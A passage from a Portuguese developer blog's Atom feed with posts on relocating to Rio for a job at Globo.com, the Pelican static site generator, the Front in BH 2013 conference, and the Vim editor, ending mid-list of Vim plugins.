diferente: Eu estava estudando as tecnologias utilizadas pelo "plim-plim" há
quase 1 ano, e idealizava como seria trabalhar para uma das maiores empresas
de mídia da América Latina.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Recebi uma recomendação (e sou eternamente grato ao &lt;em&gt;&lt;a href="https://twitter.com/franciscosouza" title="Siga o Chico no Twitter"&gt;Francisco Souza&lt;/a&gt;&lt;/em&gt; por
isso), passei pela entrevista, fui chamado, arrumei a minha mala (sim, uma só)
e me mudei para a cidade grande, na "cara e coragem".&lt;/p&gt;
&lt;p&gt;De lá para cá aconteceram inúmeras coisas na minha vida pessoal e profissional.
Aprendi muito, mais do que qualquer instituição de ensino poderia me ensinar.
Logo, caro leitor, se o seu destino é ir para a cidade grande, trabalhar em
uma grande empresa, talvez você se interesse pelo que eu tenho a dizer.&lt;/p&gt;
&lt;h2&gt;Adapte-se!&lt;/h2&gt;
&lt;p&gt;Não me considero um "carioca". Invejo colegas de trabalho, que assim como eu
vieram de outras partes do país, mas que se adaptaram com facilidade.&lt;/p&gt;
&lt;p&gt;Essa é uma lição que eu me forço a aprender todos os dias: Adapte-se.&lt;/p&gt;
&lt;p&gt;A realidade é completamente diferente daquele pedacinho de paraíso (ou
pedacinho de inferno) do qual você veio. A cultura é diferente, a economia
move-se diferente, o lazer é diferente, as pessoas são diferentes, os
problemas são diferentes, o tempo passa de uma forma diferente.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-left" src="/images/blog/adapt.jpg" width="324" height="400" title="Adapt! Veja mais em dudeologyforall.wordpress.com" alt="Adapt! Veja mais em dudeologyforall.wordpress.com"&gt;&lt;/p&gt;
&lt;p&gt;Esteja preparado para uma nova faixa salarial, bem como para um novo patamar
nos gastos. Esteja preparado para o trânsito caótico, bem como para fazer as
mais exóticas amizades. Esteja preparado para a saudade, bem como para deixar
os seus conterrâneos orgulhosos. Esteja preparado para estar por conta
própria, bem como para enfrentar desafios que você jamais enfrentaria morando
com os pais. Esteja preparado para se perder pelas ruas, bem como para
encontrar lugares magníficos pelo caminho.&lt;/p&gt;
&lt;p&gt;E esteja preparado para a violência, para a desigualdade social e para tantos
outros problemas que assolam o nosso país, e que ficam mais evidentes em uma
capital.&lt;/p&gt;
&lt;p&gt;A &lt;em&gt;&lt;a href="https://twitter.com/alexiacaldas" title="Siga a Alexia no Twitter"&gt;Alexia Caldas&lt;/a&gt;&lt;/em&gt;, atualmente &lt;em&gt;Scrum Master&lt;/em&gt; na &lt;em&gt;Globo.com&lt;/em&gt;, uma vez me
disse: &lt;em&gt;Você tem que aceitar o Rio&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;E é basicamente isso! Só depende de você encontrar uma forma de maximizar os
prós e minimizar os contras.&lt;/p&gt;
&lt;h2&gt;Controle o seu ego...&lt;/h2&gt;
&lt;p&gt;Admito que sempre tive um problema com o ego. Antes de me mudar para o Rio eu
me sentia "invencível", capaz de liderar qualquer equipe ou de enfrentar
qualquer desafio. As minhas expectativas em relação a mim mesmo eram
totalmente desproporcionais.&lt;/p&gt;
&lt;p&gt;Esse tipo de postura só é resolvida com &lt;strong&gt;choque de realidade&lt;/strong&gt;. E foi o que
aconteceu comigo logo no meu primeiro dia de &lt;em&gt;Globo.com&lt;/em&gt;. Quando você passa a
conviver com pessoas mais inteligentes (as experientes e maduras, não as
"exibicionistas") a sua falta de vivência fica tão evidente que você é
obrigado a se posicionar para resolver este problema.&lt;/p&gt;
&lt;p&gt;É fácil ter um olho em terra de cego, quero ver você se virar em terra
de &lt;a href="http://pt.wikipedia.org/wiki/Beholder" title="No RPG, você nunca irá querer se deparar com um Beholder"&gt;beholder&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;... mas não se subestime&lt;/h3&gt;
&lt;p&gt;Humildade é sempre bom, mas você deve se dar o valor. E isso é para qualquer
coisa na vida.&lt;/p&gt;
&lt;p&gt;Ser mais "aguerrido" em uma discussão se faz necessário para a tomada de
decisão, principalmente se você não acredita na decisão que está prestes a ser
tomada. Você possui a sua experiência, a sua gama de conhecimento, e &lt;strong&gt;deve&lt;/strong&gt;
articular argumentos para defender o seu ponto de vista.&lt;/p&gt;
&lt;p&gt;Nunca deixe que "os anos de casa" do seu colega sejam o diferencial para uma
batida de martelo, muito menos que o grau de instrução te
intimide perante o "embate". Os argumentos sim, esses devem ser o diferencial.&lt;/p&gt;
&lt;p&gt;As vezes optamos pelo silêncio, alegando que estamos "respeitando" a opinião
dos demais. Mas o que você enxerga como "respeito", o seu gerente/superior
pode enxergar como "covardia". Sempre tenha a sua opinião (mas esteja apto a
mudá-la quando necessário) e use bons argumentos para defendê-la (mas seja
educado).&lt;/p&gt;
&lt;p&gt;Você não está em um campo de batalha, muito menos em um monastério fazendo
voto de silêncio.&lt;/p&gt;
&lt;h2&gt;Só trabalho sem diversão faz de Jack um bobão&lt;/h2&gt;
&lt;p&gt;&lt;img class="align-center" src="/images/blog/iluminado.jpg" width="612" height="300" title="Adapt! Jack, de O Iluminado" alt="Adapt! Jack, de O Iluminado"&gt;&lt;/p&gt;
&lt;p&gt;É sempre bom lembrar: &lt;strong&gt;Não mude-se sem um tostão no bolso!&lt;/strong&gt; Tenha uma
reserva, e que ela seja uma "senhora reserva". Tenho certeza que ela será
muito útil nos primeiros meses da sua nova vida, principalmente para lidar
com aquele cheque caução do aluguel.&lt;/p&gt;
&lt;p&gt;Em contrapartida, &lt;strong&gt;não torne-se escravo do trabalho&lt;/strong&gt;. Mesmo na ausência
de "distrações" como família, amigos, namorada, cachorro, papagaio, televisão,
vídeo game, entre outros, não use 100% do seu tempo trabalhando. Mesmo que
você tenha se mudado exclusivamente por causa do trabalho (meu caso), tenha
momentos de lazer.&lt;/p&gt;
&lt;p&gt;Quando me mudei, percebi que precisava estudar uma porção de conceitos e
tecnologias utilizadas pelo time que eu ingressara. "Coisas" das quais não
aprendi na escola, curso técnico ou faculdade, mas que eles sim. Logo, passei
a investir quase a totalidade do meu tempo livre para aprender estes
conceitos, descobrir como usar essas tecnologias, qual a melhor forma de
empregar determinado padrão. Só assim eu seria capaz de acompanhá-los durante
o percorrer do projeto, certo?&lt;/p&gt;
&lt;p&gt;A intenção foi nobre, a disciplina foi notória, mas os resultados nem tanto.
Passado pouco mais de um ano, eu quase perdera total contato com a minha família, não me
alimentava direito, mal saia de casa e o meu rendimento no trabalho não
passava de razoável. O "saco cheio" foi tanto, que por muitas ocasiões
cogitei arrumar a minha mala (sim, uma só) e voltar correndo para a minha
zona de conforto.&lt;/p&gt;
&lt;p&gt;Conheça os seus limites, determine um valor para o seu tempo, crie um
coeficiente de felicidade e busque o &lt;strong&gt;equilíbrio&lt;/strong&gt; entre a sua vida pessoal e
profissional.&lt;/p&gt;
&lt;h2&gt;Para concluir&lt;/h2&gt;
&lt;p&gt;A experiência poderia ter sido melhor, isso é fato. Enfatizo novamente a
falta de equilíbrio, e também a perda de um estabelecimento de prioridades
entre minha vida pessoal e profissional.&lt;/p&gt;
&lt;p&gt;Mas se me perguntarem se me arrependo de ter tomado esta decisão, há 3 anos
atrás, eu respondo sem pestanejar: Não! E faria de novo se tivesse a
oportunidade.&lt;/p&gt;
&lt;p&gt;Em tempo, recomendo este peculiar artigo do Papo de Homem, sobre morar
sozinho: &lt;a href="http://papodehomem.com.br/o-que-ninguem-conta-sobre-morar-sozinho/" title="O que ninguém conta sobre morar sozinho"&gt;&lt;em&gt;O que ninguém conta sobre morar sozinho&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Até a próxima!&lt;/p&gt;</content><category term="profissao"></category><category term="carreira"></category><category term="globo.com"></category><category term="rio de janeiro"></category></entry><entry><title>Pelican e os static site generators</title><link href="https://klauslaube.com.br/2014/03/26/pelican-e-os-static-site-generators.html" rel="alternate"></link><published>2014-03-26T12:00:00-03:00</published><updated>2014-03-26T12:00:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2014-03-26:/2014/03/26/pelican-e-os-static-site-generators.html</id><summary type="html">&lt;p&gt;O &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; é de longe o meu &lt;em&gt;framework&lt;/em&gt; &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; favorito. Fácil,
extensível, com uma série de "baterias inclusas" que tornam o desenvolvimento
de aplicações &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt; muito mais fácil e divertido.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Mas verdade seja dita, para algumas soluções, é como se utilizássemos um
canhão para matar um mosquito. Existe toda uma …&lt;/p&gt;</summary><content type="html">&lt;p&gt;O &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; é de longe o meu &lt;em&gt;framework&lt;/em&gt; &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; favorito. Fácil,
extensível, com uma série de "baterias inclusas" que tornam o desenvolvimento
de aplicações &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt; muito mais fácil e divertido.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Mas verdade seja dita, para algumas soluções, é como se utilizássemos um
canhão para matar um mosquito. Existe toda uma preocupação no que diz respeito
a persistência, &lt;a href="https://klauslaube.com.br/tag/cache.html" title="Leia mais sobre Cache"&gt;&lt;em&gt;caching&lt;/em&gt;&lt;/a&gt;, serviço de aplicação e serviço &lt;em&gt;Web&lt;/em&gt;, que em
determinados contextos não passa de "overhead".&lt;/p&gt;
&lt;p&gt;Foi em cima dessa linha de pensamento que resolvi abandonar a &lt;em&gt;engine&lt;/em&gt; de
&lt;em&gt;blog&lt;/em&gt; &lt;a href="https://bitbucket.org/semente/django-diario" title="Conheça a engine de blogs escrita em Python e Django"&gt;&lt;em&gt;django-diario&lt;/em&gt;&lt;/a&gt;, e me aventurar pelo mundo dos geradores de sites
estáticos.&lt;/p&gt;
&lt;h2&gt;Por que um static site generator?&lt;/h2&gt;
&lt;p&gt;Geradores de sites estáticos não são nenhuma novidade, e
&lt;a href="http://staticsitegenerators.net/" title="The definitive listing of Static Site Generators"&gt;existem aos montes&lt;/a&gt;. Seja em &lt;a href="http://jekyllrb.com/" title="Transform your plain text into static websites and blogs"&gt;&lt;em&gt;Ruby&lt;/em&gt;&lt;/a&gt;, &lt;a href="http://docpad.org/" title="Designers and developers can create websites faster than ever before"&gt;&lt;em&gt;Node.js&lt;/em&gt;&lt;/a&gt;,
&lt;a href="http://dropplets.com/" title="A fresh platform dedicated to making blogging simple again"&gt;&lt;em&gt;PHP&lt;/em&gt;&lt;/a&gt; ou até mesmo em &lt;a href="http://ikiwiki.info/" title="Ikiwiki is a wiki compiler. It converts wiki pages into HTML pages suitable for publishing on a website"&gt;&lt;em&gt;Perl&lt;/em&gt;&lt;/a&gt;, a sua popularidade é notória e no mínimo
curiosa.&lt;/p&gt;
&lt;p&gt;Alguns amam, &lt;a href="http://blog.millermedeiros.com/static-site-generators/" title="Static site generators"&gt;outros odeiam&lt;/a&gt;. A verdade é que (uma vez a sua ferramenta
devidamente configurada) eles tornam a publicação de conteúdo muito simples:
Basta pegar o &lt;a href="https://klauslaube.com.br/tag/html5.html" title="Leia mais sobre HTML"&gt;&lt;em&gt;HTML&lt;/em&gt;&lt;/a&gt; gerado e jogar no seu servidor favorito, podendo
inclusive ser aquela sua hospedagem nacional, que mal funciona e que você sonha
um dia ter suporte a &lt;em&gt;Python 3&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Já passei por problemas com indisponibilidade de banco de dados, &lt;em&gt;websites&lt;/em&gt;
invadidos por falhas de segurança em aplicações como &lt;em&gt;Joomla!&lt;/em&gt; e &lt;em&gt;Wordpress&lt;/em&gt;,
e nem vou mencionar as dores de cabeça que já tive para configurar um servidor
&lt;a href="https://klauslaube.com.br/2012/11/02/entendendo-o-cgi-fastcgi-e-wsgi.html" title="Entendendo o CGI, FastCGI e o WSGI"&gt;&lt;em&gt;WSGI&lt;/em&gt;&lt;/a&gt; dentro de uma hospedagem.&lt;/p&gt;
&lt;p&gt;Com ferramentas como o &lt;a href="http://docs.getpelican.com/" title="Pelican is a static site generator, written in Python"&gt;&lt;em&gt;Pelican&lt;/em&gt;&lt;/a&gt; esses problemas deixam de existir. A
persistência é feita no seu próprio disco, o que é ótimo, já que você pode
manter o seu &lt;em&gt;blog&lt;/em&gt; inteiro (inclusive o seu conteúdo) versionado no
&lt;a href="https://github.com/kplaube/blog" title="Contribua com o código deste blog!"&gt;&lt;em&gt;GitHub&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Não estamos "regredindo" para um &lt;em&gt;web&lt;/em&gt; estática, estamos apenas explorando
diferentes meios para publicação de conteúdo :)&lt;/p&gt;
&lt;h2&gt;Pelican FTW!&lt;/h2&gt;
&lt;p&gt;Por que &lt;em&gt;Pelican&lt;/em&gt;? Porque é feito em &lt;em&gt;Python&lt;/em&gt;. Simples assim.&lt;/p&gt;
&lt;p&gt;Foi a primeira ferramenta que encontrei feita na linguagem, e desde lá venho
explorando as suas funcionalidades. Logo, seria hipocrisia dar qualquer
resposta diferente desta.&lt;/p&gt;
&lt;p&gt;É claro que a ferramenta possui seus atrativos, a começar pela ótima
integração com o &lt;a href="http://jinja.pocoo.org/docs/" title="Jinja2 is a modern and designer friendly templating language for Python, modelled after Django’s templates"&gt;&lt;em&gt;Jinja2&lt;/em&gt;&lt;/a&gt;, que torna o processo de criação dos temas muito
mais fácil e intuitivo. Estender o &lt;em&gt;Pelican&lt;/em&gt; &lt;a href="http://docs.getpelican.com/en/3.3.0/plugins.html#how-to-create-plugins" title="Como criar plugins para o Pelican"&gt;é simples&lt;/a&gt;, embora
ele já possua uma série de &lt;a href="https://github.com/getpelican/pelican-plugins" title="A bunch of plugins for the pelican blog engine."&gt;&lt;em&gt;plugins&lt;/em&gt;&lt;/a&gt; e &lt;a href="https://github.com/getpelican/pelican-themes" title="Themes for pelican"&gt;temas&lt;/a&gt; para diferentes fins,
prontinhos para uso.&lt;/p&gt;
&lt;p&gt;Nesse processo &lt;a href="https://github.com/kplaube/maggner-pelican" title="Contribua com o Maggner-Pelican"&gt;escrevi um tema&lt;/a&gt; para o &lt;em&gt;blog&lt;/em&gt;, e tendo escrito
&lt;em&gt;templates&lt;/em&gt; para &lt;em&gt;Joomla!&lt;/em&gt;, &lt;em&gt;Wordpress&lt;/em&gt; e até mesmo &lt;em&gt;Django&lt;/em&gt;, sou obrigado a
dizer: É muito, muito mais simples!&lt;/p&gt;
&lt;p&gt;Além de ser fácil de usar, a ferramenta &lt;strong&gt;pelican-quickstart&lt;/strong&gt; te entrega logo
de cara uma estrutura de projeto bem consistente, incluindo &lt;em&gt;tasks&lt;/em&gt; de
publicação através de &lt;em&gt;Makefile&lt;/em&gt; e &lt;a href="https://klauslaube.com.br/2012/02/26/automatize-o-deploy-dos-seus-projetos-com-fabric.html" title="Automatize o deploy dos seus projetos com Fabric"&gt;&lt;em&gt;Fabric&lt;/em&gt;&lt;/a&gt;. É configurar o seu
&lt;strong&gt;pelicanconf.py&lt;/strong&gt;, escolher o seu tema preferido, e sair usando.&lt;/p&gt;
&lt;p&gt;Lembro de começar a usar o &lt;em&gt;Pelican&lt;/em&gt; antes da sua versão &lt;strong&gt;3.3&lt;/strong&gt;, e foi uma
tremenda dor de cabeça. Essa última versão está mais "redonda", sua
documentação abrange muito bem os passos de escrita conteúdo e criação de temas.&lt;/p&gt;
&lt;p&gt;Minha maior crítica fica na fraca solução dada para instalação e gerência de
temas e &lt;em&gt;plugins&lt;/em&gt;. Fico na esperança de alguma boa alma chegar com uma ideia
muito boa para resolver esse problema.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;Hype&lt;/em&gt; ou não, os &lt;em&gt;static site generators&lt;/em&gt; possuem sim o seu valor. Se você
está querendo blogar, ou está cansado de lidar com aquele seu &lt;em&gt;Wordpress&lt;/em&gt; que
mais parece um elefante branco, considere utilizar uma dessas ferramentas.&lt;/p&gt;
&lt;p&gt;E se você é pythonista, considere utilizar o &lt;em&gt;Pelican&lt;/em&gt;. Quanto mais gente
talentosa estendendo-o, melhor ele ficará!&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="blog"></category><category term="pelican"></category><category term="python"></category></entry><entry><title>Opinião: Front in BH 2013</title><link href="https://klauslaube.com.br/2013/08/05/opiniao-front-bh-2013.html" rel="alternate"></link><published>2013-08-05T15:39:45-03:00</published><updated>2013-08-05T15:39:45-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2013-08-05:/2013/08/05/opiniao-front-bh-2013.html</id><summary type="html">&lt;p&gt;No dia 03 de agosto de 2013, tive o prazer de participar do &lt;a href="http://frontinbh.com.br/" title="O Maior evento de Front-end do Brasil"&gt;&lt;em&gt;Front in BH&lt;/em&gt;&lt;/a&gt;,
edição 2013. Organizado pelo &lt;a href="https://twitter.com/davidsonfellipe" title="Siga o Davidson no Twitter"&gt;&lt;em&gt;@davidsonfellipe&lt;/em&gt;&lt;/a&gt; e &lt;a href="https://twitter.com/keppelen" title="Siga o Giovanni no Twitter"&gt;&lt;em&gt;@keppelen&lt;/em&gt;&lt;/a&gt;, o evento
contou com palestrantes de peso e com uma organização que, além de
surpreendente, tirou um "gosto ruim" que eu tinha em relação a eventos
de …&lt;/p&gt;</summary><content type="html">&lt;p&gt;No dia 03 de agosto de 2013, tive o prazer de participar do &lt;a href="http://frontinbh.com.br/" title="O Maior evento de Front-end do Brasil"&gt;&lt;em&gt;Front in BH&lt;/em&gt;&lt;/a&gt;,
edição 2013. Organizado pelo &lt;a href="https://twitter.com/davidsonfellipe" title="Siga o Davidson no Twitter"&gt;&lt;em&gt;@davidsonfellipe&lt;/em&gt;&lt;/a&gt; e &lt;a href="https://twitter.com/keppelen" title="Siga o Giovanni no Twitter"&gt;&lt;em&gt;@keppelen&lt;/em&gt;&lt;/a&gt;, o evento
contou com palestrantes de peso e com uma organização que, além de
surpreendente, tirou um "gosto ruim" que eu tinha em relação a eventos
de &lt;em&gt;front-end&lt;/em&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Descontraído porém relevante. Talvez essa seja a melhor definição para esta
edição. Não participei das anteriores, mas os &lt;em&gt;feedbacks&lt;/em&gt; positivos são
suficientes para adicionar o &lt;em&gt;Front in BH&lt;/em&gt; na minha agenda de eventos para o
próximo ano.&lt;/p&gt;
&lt;h2&gt;Expectativas&lt;/h2&gt;
&lt;p&gt;Talvez eu tenha gostado tanto do &lt;em&gt;Front in BH&lt;/em&gt; por ter controlado as minhas
expectativas. Em alguns eventos que fui recentemente, me senti mais em um show
de &lt;em&gt;stand up comedy&lt;/em&gt; ruim do que em um evento de tecnologia. Não que os
palestrantes precisem ser totalmente sérios, mas a última coisa que nós como
público precisamos é ficar aturando piadas ruins.&lt;/p&gt;
&lt;p&gt;Entrei pelos portões do &lt;em&gt;Teatro Ney Soares&lt;/em&gt; sem nem mesmo saber os tópicos que
seriam discutidos. Fui para prestigiar o trabalho de alguns camaradas, e não
me arrependi.&lt;/p&gt;
&lt;h2&gt;Resultados&lt;/h2&gt;
&lt;p&gt;A verdade é que este evento teve conteúdo e humor em uma dosagem equilibrada.
O &lt;a href="https://twitter.com/bernarddeluna" title="Siga o Bernard no Twitter"&gt;&lt;em&gt;@bernarddeluna&lt;/em&gt;&lt;/a&gt; e o &lt;a href="https://twitter.com/zenorocha" title="Siga o Zeno no Twitter"&gt;&lt;em&gt;@zenorocha&lt;/em&gt;&lt;/a&gt; mandaram muito bem nos intervalos
entre as palestras, deixando o público "aceso" e acredito que quebrando um
pouco do "gelo" entre público e palestrante.&lt;/p&gt;
&lt;p&gt;Na minha opinião a palestra matadora foi a do &lt;a href="https://twitter.com/sergio_caelum" title="Siga o Sérgio no Twitter"&gt;&lt;em&gt;@sergio_caelum&lt;/em&gt;&lt;/a&gt;, com o título
"Repensando o front-end para telas de alta resolução". É o tipo de discussão
que cabe em qualquer evento sobre desenvolvimento &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;Web&lt;/em&gt;&lt;/a&gt;.
Muito boa a "performance" do palestrante, fora que o conteúdo apresentado foi
excepcional.&lt;/p&gt;
&lt;p&gt;Um ponto que vale observar: Estamos preocupados, tanto no &lt;em&gt;back-end&lt;/em&gt; quanto
no &lt;em&gt;front-end&lt;/em&gt;, com &lt;a href="https://klauslaube.com.br/tag/testes.html" title="Leia mais sobre testes"&gt;automatização de testes&lt;/a&gt;. As palestras do
&lt;a href="https://twitter.com/cironunesdev" title="Siga o Ciro no Twitter"&gt;&lt;em&gt;@cironunesdev&lt;/em&gt;&lt;/a&gt; e do &lt;a href="https://twitter.com/andrewsmedina" title="Siga o Andrews no Twitter"&gt;&lt;em&gt;@andrewsmedina&lt;/em&gt;&lt;/a&gt; foram o suficiente para apontar
caminhos no que diz respeito a testes &lt;a href="https://klauslaube.com.br/tag/javascript.html" title="Leia mais sobre Javascript"&gt;&lt;em&gt;Javascript&lt;/em&gt;&lt;/a&gt; e de interfaces.&lt;/p&gt;
&lt;p&gt;As palestras foram muito boas. O que prova que qualidade sempre traz maiores
benefícios que a quantidade.&lt;/p&gt;
&lt;h2&gt;Considerações Finais&lt;/h2&gt;
&lt;p&gt;Um evento bem organizado, dinâmico e extremamente relevante. Se você é
&lt;em&gt;front-end&lt;/em&gt; e tem disponibilidade de ir a &lt;em&gt;BH&lt;/em&gt;, é obrigação sua participar da
próxima edição do &lt;em&gt;Front in BH&lt;/em&gt;. É visível que foi feito com cuidado e
carinho, e é uma ótima oportunidade para você conhecer excelentes
profissionais da área.&lt;/p&gt;
&lt;p&gt;Até a próxima...&lt;/p&gt;</content><category term="opiniao"></category><category term="front-end"></category><category term="evento"></category></entry><entry><title>Vim: O meu editor favorito</title><link href="https://klauslaube.com.br/2013/03/04/vim-o-meu-editor-favorito.html" rel="alternate"></link><published>2013-03-04T22:34:38-03:00</published><updated>2013-03-04T22:34:38-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2013-03-04:/2013/03/04/vim-o-meu-editor-favorito.html</id><summary type="html">&lt;p&gt;Há um bom tempo que eu trabalho com o &lt;a href="http://www.vim.org/" title="Página oficial do Vim"&gt;&lt;em&gt;Vim&lt;/em&gt;&lt;/a&gt;,
tanto tempo que quando estou em qualquer outro editor escrevo &lt;code&gt;:wq&lt;/code&gt;
para salvar e sair.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Mas não comecei a utilizar o &lt;em&gt;Vim&lt;/em&gt; por gostar de desafios… foi pura
necessidade! Trabalhei em uma empresa onde desenvolvíamos em uma máquina
remota, através …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Há um bom tempo que eu trabalho com o &lt;a href="http://www.vim.org/" title="Página oficial do Vim"&gt;&lt;em&gt;Vim&lt;/em&gt;&lt;/a&gt;,
tanto tempo que quando estou em qualquer outro editor escrevo &lt;code&gt;:wq&lt;/code&gt;
para salvar e sair.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Mas não comecei a utilizar o &lt;em&gt;Vim&lt;/em&gt; por gostar de desafios… foi pura
necessidade! Trabalhei em uma empresa onde desenvolvíamos em uma máquina
remota, através de linha de comando. Logo, entre o &lt;em&gt;Vim&lt;/em&gt; e &lt;em&gt;Emacs&lt;/em&gt; (ou
ficar subindo arquivos via &lt;em&gt;FTP&lt;/em&gt; ou &lt;em&gt;SSH&lt;/em&gt;), optei pelo mais fácil de
usar. É claro que no início eu não conseguia encontrar facilidade de
jeito nenhum. Navegar pelas teclas &lt;code&gt;h&lt;/code&gt;, &lt;code&gt;j&lt;/code&gt;, &lt;code&gt;k&lt;/code&gt; e &lt;code&gt;l&lt;/code&gt; não fazia
sentido nenhum para mim, sem falar que (segundo os meus colegas de
trabalho) utilizar o &lt;code&gt;PageUp&lt;/code&gt; , &lt;code&gt;PageDown&lt;/code&gt;, &lt;code&gt;Home&lt;/code&gt; e &lt;code&gt;End&lt;/code&gt; era
praticamente uma heresia.&lt;/p&gt;
&lt;p&gt;Mas aos poucos o editor foi conquistando a minha simpatia, e foi me
mostrando as suas principais virtudes em relação a outras aplicações. É
fato que não sou nenhum “guru” no assunto, mas me sinto na obrigação de
compartilhar alguns dos pontos que mais me chamaram a atenção com o uso
do &lt;em&gt;Vim&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Todas as teclas ao alcance das mãos&lt;/h2&gt;
&lt;p&gt;Não vou contar a &lt;a href="http://en.wikipedia.org/wiki/Vim_(text_editor)" title="Leia mais sobre o Vim na Wikipedia"&gt;história do &lt;em&gt;Vim&lt;/em&gt;&lt;/a&gt;, muito menos ficar explicando
como &lt;a href="http://aurelio.net/vim/" title="o site do Aurélio é um dos melhores locais para se aprender Vim"&gt;utilizar a ferramenta&lt;/a&gt;. Eu vou simplesmente apresentar os
motivos pelo qual eu gosto desse simpático editor de textos.&lt;/p&gt;
&lt;p&gt;A principal vantagem em usar o &lt;em&gt;Vim&lt;/em&gt; é que você tem controle total sobre
o conteúdo, sem necessitar movimentar muito as suas mãos. O uso de
&lt;em&gt;mouse&lt;/em&gt; é totalmente dispensável, sem falar da interface gráfica. Hoje,
com variações como o &lt;em&gt;Gvim&lt;/em&gt;, &lt;em&gt;MacVim&lt;/em&gt; e &lt;em&gt;Pida&lt;/em&gt;, temos algumas
facilidades e melhorias na experiência de uso (principalmente pelo uso
da &lt;em&gt;GUI&lt;/em&gt;), em relação ao “&lt;em&gt;Vim&lt;/em&gt; puro”, que tornam o dia-a-dia muito mais
fácil e prático.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center" src="/images/blog/vim-layout.png" width="600" height="199" title="Teclas do VIM" alt="Teclas do VIM"&gt;&lt;/p&gt;
&lt;p&gt;Outro ponto interessante é que seja no &lt;em&gt;Linux&lt;/em&gt;, &lt;em&gt;Mac&lt;/em&gt; ou &lt;em&gt;Windows&lt;/em&gt;, a
experiência básica é a mesma. Você “sofre” menos com o &lt;em&gt;layout&lt;/em&gt; do
teclado, principalmente pelo fato do editor “abolir” o uso de
direcionais, e manter a experiência mais “uniforme” independentemente da
plataforma.&lt;/p&gt;
&lt;h2&gt;Customizações&lt;/h2&gt;
&lt;p&gt;Outra característica muito importante do &lt;em&gt;Vim&lt;/em&gt; é a sua customização. É
possível alterar desde comportamentos básicos como fonte de texto,
cores, teclas de atalho e navegação, até comportamentos mais avançados
como a &lt;a href="http://net.tutsplus.com/tutorials/other/vim-essential-plugin-nerdtree/" title="Conheça o NerdTree"&gt;exibição de uma árvore de arquivos&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;É possível criar &lt;em&gt;plugins&lt;/em&gt; utilizando &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;, &lt;em&gt;Lua&lt;/em&gt;, &lt;em&gt;Perl&lt;/em&gt;,
&lt;em&gt;Ruby&lt;/em&gt;, etc. O editor também possui uma linguagem própria de &lt;em&gt;scripts&lt;/em&gt;
chamada &lt;a href="http://en.wikipedia.org/wiki/Vimscript" title="Saiba mais sobre a Vimscript no Wikipedia"&gt;&lt;em&gt;Vimscript&lt;/em&gt;&lt;/a&gt;. No &lt;em&gt;site&lt;/em&gt; do &lt;em&gt;Vim&lt;/em&gt; você pode conferir uma
&lt;a href="http://www.vim.org/scripts/index.php" title="Vim scripts"&gt;extensa lista de &lt;em&gt;plugins&lt;/em&gt;&lt;/a&gt;. Também é possível acompanhar o
desenvolvimento de &lt;a href="https://github.com/vim-scripts" title="vim-scripts no GitHub"&gt;extensões no &lt;em&gt;GitHub&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Um dos &lt;em&gt;plugins&lt;/em&gt; mais sensacionais é o &lt;a href="https://github.com/gmarik/vundle" title="Repositório do Vundle no GitHub"&gt;&lt;em&gt;Vundle&lt;/em&gt;&lt;/a&gt;. Trata-se de um
gerenciador de extensões, onde de maneira muito simples é possível
instalar e atualizar os mais variados tipos de soluções para o editor.
Com ele, fica muito mais fácil &lt;a href="https://github.com/kplaube/vimfiles" title="Veja o meu vimrc no GitHub"&gt;versionar e distribuir o seu &lt;em&gt;vimrc&lt;/em&gt;&lt;/a&gt;
para o seu grupo de trabalho.&lt;/p&gt;
&lt;p&gt;Abaixo estão algumas extensões que não podem faltar no meu ambiente de
trabalho:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/kien/ctrlp.vim" title="Ctrlp no GitHub"&gt;&lt;em&gt;ctrlp.vim&lt;/em&gt;&lt;/a&gt; – Encontre arquivos e &lt;em&gt;tags&lt;/em&gt; em seus projetos&lt;/li&gt;
